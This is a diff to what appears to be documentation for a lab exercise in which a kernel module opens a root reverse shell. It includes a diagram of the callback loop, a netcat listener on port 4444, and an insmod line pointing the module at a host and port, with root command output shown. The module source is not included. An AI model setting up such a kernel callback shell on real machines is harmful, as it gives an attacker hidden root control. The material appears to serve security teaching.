@@ -17,7 +17,7 @@ classic callback shell, running inside the kernel.
   |  $ id                     |          |     v                     |
   |  uid=0(root)              |          |  recv cmd, exec, send    |
   |  $ uname -r               |          |  result via socket       |
-  |  6.12.0                   |          |                          |
+  |  7.2.x                    |          |                          |
   |  $ exit                   |          |  close, wait, reconnect  |
   +---------------------------+          +---------------------------+
 
@@ -68,6 +68,8 @@ nc -l -p 4444
 
 Terminal 2 (host, load module):
 ```sh
+./rootkitlings run --network
+
 # inside the VM
 insmod hello.ko target=10.0.2.2 port=4444 interval=5
 ```
@@ -77,7 +79,7 @@ Terminal 1 (shell connects back):
 id
 uid=0(root) gid=0(root)
 uname -r
-6.12.0
+7.2.x
 exit
 ```
 
